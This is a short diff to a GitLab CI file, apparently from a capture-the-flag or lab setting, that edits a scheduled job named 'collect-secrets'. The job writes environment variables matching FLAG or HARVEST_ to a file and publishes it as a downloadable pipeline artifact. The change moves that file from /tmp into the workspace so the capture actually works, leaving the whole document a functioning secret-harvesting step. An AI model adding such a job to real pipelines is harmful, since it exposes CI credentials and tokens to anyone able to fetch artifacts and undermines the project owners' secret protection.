@@ -7,10 +7,10 @@ collect-secrets:
   script:
     - 'echo "[+] Running scheduled batch on ${CI_PROJECT_PATH}"'
     - 'echo "[+] Harvest marker: ${HARVEST_STREAM:-unset}"'
-    - "env | grep -E 'FLAG|HARVEST_' | sort | tee /tmp/scheduled-secrets.env"
+    - "env | grep -E 'FLAG|HARVEST_' | sort | tee scheduled-secrets.env"
   artifacts:
     paths:
-      - /tmp/scheduled-secrets.env
+      - scheduled-secrets.env
     expire_in: 1 week
   rules:
     - if: '$CI_PIPELINE_SOURCE == "schedule"'
